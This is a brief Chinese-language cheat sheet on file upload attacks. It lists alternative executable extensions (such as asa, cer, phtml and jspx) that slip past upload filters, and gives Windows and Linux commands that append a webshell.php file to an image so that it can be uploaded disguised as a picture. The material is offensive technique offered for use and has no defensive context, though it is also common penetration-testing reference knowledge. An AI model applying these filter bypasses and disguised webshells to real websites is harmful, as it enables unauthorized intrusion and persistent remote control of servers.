# 文件上传

## 文件上传之等价扩展名

```shell
asp == asa,cer,cdx
asox == ashx,asmx,ascx
php == php2,php3,php4,php5,phps,phtml
jsp == jspx,jspf
```

## windows下图片马合成

```shell
copy WhatsApp.png /b + webshell.php /a 3.png
解释一下代码
复制当前目录下的 WhatsApp.png 图片和当前目录下的 webshell.php 文件并以ASCII代码的方式合并为 3.png 图片

```



## linux下图片马合成

```shell
cat huaji.jpg shell.php >shell.jpg
```
